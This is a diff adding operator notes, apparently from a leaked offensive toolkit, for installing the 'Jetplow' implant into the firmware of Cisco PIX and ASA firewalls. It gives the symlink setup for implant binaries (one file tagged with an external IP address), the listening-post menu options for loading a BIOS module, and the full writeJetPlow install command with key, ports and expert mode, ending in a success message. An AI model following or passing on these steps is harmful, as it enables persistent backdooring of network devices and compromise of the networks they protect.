@@ -1,0 +1,67 @@
+################## Jetplow ###################
+
+# Copy your jetplow implant to the jp directory
+
+/current/bin/FW/BGXXXX/Install/LP/jp
+
+# Then you need to create sym links
+
+# FOR A GENERAL PIX
+cd /current/bin/FW/BGXXX/Install/LP/jetplow
+ln -s ../jp/orig_ua.bin orig_bg_pixGen.bin
+ln -s ../jp/orig_code.bin orig_code_pixGen.bin
+ln -s ../jp/orig_hook.bin orig_hook_pixGen.bin 
+ln -s ../jp/jp11_hook_gen.bin hook_pixGen.bin 
+ln -s ../jp/jp11_code_pixGen.bin jp_code_pixGen.bin 
+ln -s ../jp/BG2111_sicklestar_202.163.69.189.jp jp_ua_pixGen.bin
+
+# FOR A PIX ASA
+cd /current/bin/FW/BGXXX/Install/LP/jetplow
+ln -s ../jp/jp11_hook_flash_asaGen.bin hook_flash_asaGen.bin
+ln -s ../jp/jp11_code_asaGen.bin jp_code_asaGen.bin
+ln -s ../jp/darkhammer_192.168.0.1.jp jp_ua_asaGen.bin
+ln -s ../jp/ver_1_11_2_orig_flash_asaGen.bin orig_flash_hook_asaGen.bin
+ln -s ../jp/orig_code.bin orig_code_asaGen.bin
+ln -s ../jp/orig_ua.bin orig_bg_asaGen.bin
+
+ls -latr
+
+cd ..
+
+# Now we have to load the bios module to the pix, so we can write to it.
+# Connect up to the PIX with the LP.
+Option 1 to connect.
+Option 31 to load module
+
+#### NOTE: 
+# The bios module you want is the biosModule_....mod. The three versions are based on 
+# the version of BIOS the pix has. You usually need the AM29F.mod module. If you 
+# upload the wrong BIOS, don't worry, it won't crush anything.
+
+Choose Option 32 to activate the module.
+Choose Option 9 to close out of the session
+Choose Option 0 to close the lp
+
+# Now we are ready to jetplow the pix. You should still be in the lp directory.
+# Run binary without options to get usage
+
+./writeJetPlow-2130
+
+# Now actually run it:
+# The only way to do a jetplow upgrade is to use the INSTALL operation mode and use expert mode.
+
+./writeJetPlow-2130 --lp 127.0.0.1 --implant 127.0.0.1 --idkey project.key --sport 23435 --dport 45453 --readCmd 18 --writeCmd 19 --operation INSTALL --dir jetplow --expert --platform PIX###
+
+# You will see defaults, just press enter through them, if you get an error,
+# seek help
+
+# Now you should get 3 prompts. This is because the script is looking at the 
+# memory on the pix and expecting it to have a clean IOS install. Since we have 
+# jetplow or speedplow there already, it's not clean. So we need to just proceed anyway.
+
+
+JETPLOW Installation Operation - Successful.
+
+
+## And we are done.
+
